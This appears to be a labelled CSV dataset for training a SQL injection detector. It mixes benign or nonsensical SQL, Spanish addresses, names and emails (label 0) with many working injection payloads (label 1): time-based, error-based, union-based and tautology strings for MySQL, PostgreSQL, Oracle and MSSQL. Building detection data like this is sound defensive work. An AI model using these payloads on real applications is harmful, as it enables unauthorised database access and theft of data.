Query,Label
"1""   )    )    and sleep  (  5  )  #",1
-3578'   )    )     )   order by 1--,1
SELECT * FROM bush WHERE enter = 'hundred'  OR coming = 'mud',0
"SELECT Orders.tobaccorID, Employees.single, Employees.die FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whoseID ORDER BY Orders.bottleID",0
SELECT * FROM seat FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM generally,0
SELECT * FROM member FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM balloon,0
1'  )   where 2763  =  2763,1
SELECT goose ( s )  FROM actual LEFT JOIN,0
"UPDATE mental SET win =  'cake', City =  'afternoon' WHERE me =  pull",0
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0
SELECT * FROM these WHERE due = 'one' FETCH FIRST 3 ROWS ONLY,0
-8523  )   as hzqs where 8944  =  8944 order by 1--,1
"1'  )   and make_set  (  7187  =  4625,4625  )   and   (  'diai' like 'diai",1
salillas de jaln,0
"c/ cardenal rossell, 85,",0
"1   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  6312  =  6312",1
dillard,0
"SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID )",0
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,1
"1"" where 5236  =  5236 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
inofensiva,0
5309,0
1'   )    )    as pgif where 6346  =  6346,1
1'||  (  select 'tjzy' where 3037  =  3037,1
"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1
"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",1
3.24209E+15,0
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1
"passatge badal, 31,",0
1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',1
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0
lora@rocofer.jobs,0
"SELECT Orders.halfwayrID, Employees.sale, Employees.good FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.woolID ORDER BY Orders.governmentID",0
"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
DELETE FROM rhyme,0
SELECT electric ( s )  FROM equally UNION,0
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1
requena de campos,0
"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"SELECT * FROM wire ORDER BY receive, knife",0
1'+  (  select lptb where 3861  =  3861 or sleep  (  5   )    )   +',1
SELECT TOP 50 PERCENT * FROM already SELECT * FROM teacher FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM darkness,0
42836631m,0
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
"INSERT INTO motor ( air, angry, thread, excellent, elephant, type )  VALUES  ( 'screen', 'rate'. ago', 'won', 'chemical', 'putting', 'buried' )",0
SELECT AVG ( map ) FROM still,0
DELETE FROM cabin WHERE softly = 'compare',0
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM six,0
arpe*nde,0
jamaal,0
SELECT AVG ( experiment ) FROM remain SELECT SUM ( apartment ),0
(  case when 5640  =  5640 then 5640 else null end  ),1
telsfora,0
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",1
"passeig desert 180,",0
SELECT * FROM everyone FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM both,0
youji,0
"SELECT weather AS sold, construction AS [sit]  FROM bar",0
zohreh,0
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1
SELECT surface ( s FROM pan RIGHT JOIN,0
-2411%'   )    )     )   or 6872  =  6872 and    (    (     (  '%'  =  ',1
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",1
-5352%'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',1
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1%""   )    )     )   union all select null,null,null,null--",1
SELECT TOP 50 PERCENT * FROM combination,0
SELECT TOP 50 PERCENT * FROM present SELECT * FROM ate FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM water,0
indamira,0
calvin@espaciodelpintor.by,0
"c/ de las gloxinias 91,",0
SELECT dangerous,0
"c/ 57 15, 9g",0
SELECT rabbit FROM plant UNION SELECT kids FROM stuck ORDER BY follow,0
SELECT * FROM helpful WHERE zebra = 'hurt' LIMIT 3,0
"-5493""   )    )    union all select 8001,8001--",1
bayarri bach,0
"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",1
SELECT * FROM place WHERE finest = 'essential' LIMIT 3,0
select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --,1
SELECT * FROM verb WHERE attention = 'train',0
"-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '",1
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1
schwuchow9@viajessolomujeres.bj,0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT AVG ( outside ) FROM combine,0
"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )",1
alcalde gregorio espino 165,0
24443,0
"1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589",1
"SELECT COUNT ( immediately ) , policeman FROM length BY seldom",0
resquebrar,0
SELECT asleep ( s FROM usual RIGHT JOIN,0
"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
tomono@esteticadayda.az,0
5154,0
"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",1
SELECT weigh ( s )  FROM pole FULL OUTER JOIN,0
SELECT * FROM indeed,0
-4595'  )   where 4892  =  4892 order by 1--,1
SELECT * FROM women WHERE ride = 'closely'  OR process = 'passage',0
1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,1
1  )   and 3861  =  5813--,1
1 where 4787  =  4787,1
SELECT * FROM strip,0
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",1
-6843' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eeff'  =  'eeff,1
SELECT TOP 3 * FROM citizen SELECT * FROM saw 3SELECT * FROM jungle,0
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",1
SELECT MIN ( plastic )  AS rocket FROM earlier,0
SELECT file FROM wp_sm_sync,0
"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1
novelador,0
"SELECT protectionID AS ID, conversation AS plural FROM imagine",0
or '1'  =  '1,1
kalila,0
71196230y,0
SELECT itself ( s )  FROM grandfather FULL OUTER JOIN,0
5.83899E+15,0
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",1
SELECT indicate FROM western UNION SELECT shelf FROM accurate ORDER BY warm,0
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",1
SELECT * FROM announced WHERE stop = 'tired'  AND City = 'oldest',0
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1
"INSERT INTO we  ( parts, held, gasoline )  VALUES  ( 'diameter', 'police', 'doll' )",0
SELECT * FROM strength ORDER BY difference,0
1839,0
DELETE FROM dead WHERE rabbit = 'jump',0
"SELECT colorID AS ID, identity AS hay FROM date",0
SELECT * FROM perfectly WHERE describe = 'fairly' FETCH FIRST 3 ROWS ONLY,0
-7726 or 3038  =  3038,1
SELECT MIN ( biggest )  AS mind FROM calm,0
"1 and make_set  (  6911  =  1867,1867  )",1
SELECT * FROM dot WHERE broken = 'mine' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM positive WHERE shinning IN  ( SELECT position FROM bill ),0
SELECT AVG ( labor ) FROM table SELECT SUM ( lower ),0
"1'||  (  select 'yrau' where 7860  =  7860 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
select   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  select 3681 from information_schema.character_sets  )   end  )  #,1
"SELECT column_name ( s )  FROM connected,purple",0
SELECT bell ( s )  FROM main,0
calle juan agui 97 9-e,0
SELECT * FROM gather WHERE scared NOT LIKE 'cap%',0
SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM press WHERE brief BETWEEN 'neighborhood' AND 'bent',0
66,0
SELECT * FROM growth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM managed,0
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,0
"select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
SELECT * FROM choose WHERE    NOT courage = 'animal',0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1
SELECT fire ( s ) FROM stepped INNER JOIN,0
"1"" where 4633  =  4633 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM wheel,0
"c/ pontevedra 25, 6a",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",0
SELECT * FROM friendly WHERE pictured = 'name'  AND City = 'growth',0
SELECT TOP 3 * FROM fifty SELECT * FROM physical 3SELECT * FROM rays,0
"senda buen paso s/n,",0
whiteside.seyfferrtitz@cohel.uk,0
"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
UEv,1
SELECT tool ( s )  FROM list SELECT exact ( s ),0
SELECT 10 DIV 5;,0
select   (  case when   (  8993  =  4660  )   then 1 else 8993*  (  select 8993 from master..sysdatabases  )   end  )  --,1
"-8929%'  )   union all select 9486,9486,9486,9486#",1
SELECT * FROM honor FETCH FIRST 3 ROWS ONLY,0
arrafiz,0
begues,0
6.44911E+15,0
"c/ avi xaxu, 157,",0
SELECT * FROM today WHERE bottle = 'importance' FETCH FIRST 3 ROWS ONLY,0
SELECT police ( s )  FROM luck SELECT not FROM exist,0
1   )    )     )   and 6467  =  1864#,1
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
baqu,0
"SELECT aroundID AS ID, value AS tongue FROM surprise",0
SELECT CURTIME (  )  + 1;,0
SELECT * FROM riding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM curious,0
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1
1  )   union all select null#,1
SELECT sink ( s )  FROM purpose SELECT easy ( s ),0
aldearrodrigo,0
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1
"SELECT WEEK ( ""2017-06-15"" ) ;",0
SELECT TOP 3 * FROM bush WHERE themselves = 'declared' SELECT * FROM nation,0
"SELECT * FROM route WHERE south BETWEEN ""couple"" AND    ""forward""",0
1596,0
rumsey@ubikuo.coop,0
"-3781%'  )   union all select 7497,7497,7497,7497,7497--",1
"1""  )   as dlfq where 8410  =  8410",1
SELECT column_name FROM table2 ;,0
"INSERT INTO what  ( who, score, separate )  VALUES  ( 'duty', 'dirty', 'turn' )",0
SELECT Count ( * )  AS mission,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_cell_number' LIMIT 1,0
1' where 9416  =  9416,1
"SELECT tired AS history, slide AS [too]  FROM plenty",0
SELECT negative ( s ) FROM bend INNER JOIN,0
chilln,0
"SELECT * FROM express ORDER BY whispered ASC, plain DESC",0
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,1
1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
1'  )   as wjty where 2971  =  2971,1
SELECT * FROM gulf WHERE stream IN  ( SELECT flame FROM got ),0
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
SELECT * FROM west  WHERE plates NOT LIKE '[far]%',0
2el6s,0
SELECT COUNT ( nuts ) FROM count,0
SELECT * FROM entire FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM finish,0
masapati,0
-1396 where 5838  =  5838 or 9323  =  9323#,1
1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,1
"1""   )    )    and 8329  =  5584#",1
"SELECT * FROM solid ORDER BY captured, nest",0
SELECT * FROM bank WHERE    NOT word = 'evidence',0
1'||  (  select 'bzxa' where 6320  =  6320,1
cortada mercader,0
4.47104E+15,0
"-8609' union all select 9384,9384,9384,9384--",1
SELECT food ( s )  FROM evening UNION,0
calle nieto 41,0
montroy,0
"-4453'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'boxt'  =  'boxt",1
ti7o,0
SELECT * FROM calm WHERE plate IN  ( SELECT three FROM sun ),0
otumba 24 13e,0
"c/ fuente pista de tenis, 164",0
haiti 27 1?g,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",1
SELECT * FROM thou WHERE cost = 'missing'  AND City = 'compare',0
"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",1
idelfonsa,0
"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",1
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,1
